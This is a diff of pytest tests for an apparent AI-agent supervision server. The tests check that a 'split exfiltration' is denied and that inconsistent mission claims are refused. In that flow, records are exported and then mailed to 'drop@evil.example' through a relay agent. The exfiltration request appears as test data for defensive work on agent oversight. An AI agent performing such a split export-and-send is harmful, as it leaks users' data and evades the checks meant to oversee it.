@@ -52,3 +52,71 @@ def test_the_same_send_alone_is_allowed():
     s256 = connected(env, resources=(RECORDS, MAIL))
     send = {"operations": [{"tool": "send_email"}], "parameters": {"to": "drop@evil.example"}}
     assert _decide(env, s256, MAIL, send, SUBAGENT) == "allow"
+
+
+RELAY = "aauth:relay@tools.example"
+
+
+def _relay_send(env, s256, envelope):
+    # An intermediary downstream in the chain (Protocol L842): it sends no `mission_s256`
+    # of its own; the mission comes with the upstream token, and the resource token copies
+    # it unchanged (L755).
+    from aauth_supervision_server.testing import make_jwt
+    ss, ps, clock = env
+    send = {"operations": [{"tool": "send_email"}], "parameters": {"to": "drop@evil.example"}}
+    raw, digest = r3_bytes(send)
+    body = {"sdi": ps.nid("d"), "act": "auth_token", "iat": int(clock()), "sub": SUB,
+            "agent": RELAY, "agent_token": ps.agent_token(RELAY),
+            "resource_token": ps.resource_token(MAIL, "", digest, s256),
+            "presented_token": "a.b.c", "r3_proposal": b64u(raw),
+            "upstream_token": make_jwt(ps.key, "aa-auth+jwt", {
+                "iss": "https://as.example", "ps": ps.issuer, "sub": "p",
+                "mission_s256": s256}), **envelope}
+    return ps.call(ss, "POST", "/decision", body)
+
+
+@pytest.mark.parametrize("envelope", ["same", "none"])
+def test_a_relay_s_act_is_in_the_mission_its_tokens_carry(envelope):
+    # Supervision L201 names the mission "when it names one"; a PS may leave it to the
+    # tokens. Either way the act is the mission's, and the split exfiltration is denied.
+    env = make_env(transport="forwarded")
+    s256 = connected(env, resources=(RECORDS, MAIL))
+    read = {"operations": [{"tool": "export"}], "parameters": {}}
+    assert _decide(env, s256, RECORDS, read, {}) == "allow"
+    r = _relay_send(env, s256, {"mission_s256": s256} if envelope == "same" else {})
+    assert r.status == 200 and r.json()["decision"] == "deny"
+
+
+def test_an_envelope_mission_the_tokens_contradict_is_refused():
+    env = make_env(transport="forwarded")
+    s256 = connected(env, resources=(RECORDS, MAIL))
+    r = _relay_send(env, s256, {"mission_s256": "x" * 43})
+    assert r.status == 400 and r.json()["detail"] == (
+        "mission_s256 is not the mission the forwarded tokens carry")
+
+
+def test_a_relay_s_decision_is_recorded_in_the_mission_its_tokens_carry():
+    # Its issuance, reported later, is then booked in that mission, where the acts after
+    # it compose with it.
+    from aauth_supervision_server.store import Store
+    env = make_env(transport="forwarded")
+    ss, ps, _ = env
+    s256 = connected(env, resources=(RECORDS, MAIL))
+    r = _relay_send(env, s256, {})
+    assert r.status == 200
+    assert ss.store.decisions[Store.k(ps.issuer, r.json()["sdi"])].mission_s256 == s256
+
+
+def test_a_forwarded_token_whose_mission_is_not_a_string_is_refused():
+    from aauth_supervision_server.testing import make_jwt
+    env = make_env(transport="forwarded")
+    ss, ps, clock = env
+    connected(env, resources=(RECORDS, MAIL))
+    body = {"sdi": ps.nid("d"), "act": "auth_token", "iat": int(clock()), "sub": SUB,
+            "agent": RELAY, "agent_token": ps.agent_token(RELAY),
+            "resource_token": ps.resource_token(MAIL), "presented_token": "a.b.c",
+            "upstream_token": make_jwt(ps.key, "aa-auth+jwt", {"ps": ps.issuer,
+                                                               "mission_s256": 7})}
+    r = ps.call(ss, "POST", "/decision", body)
+    assert r.status == 400 and r.json()["detail"] == (
+        "upstream_token mission_s256 is not a string")
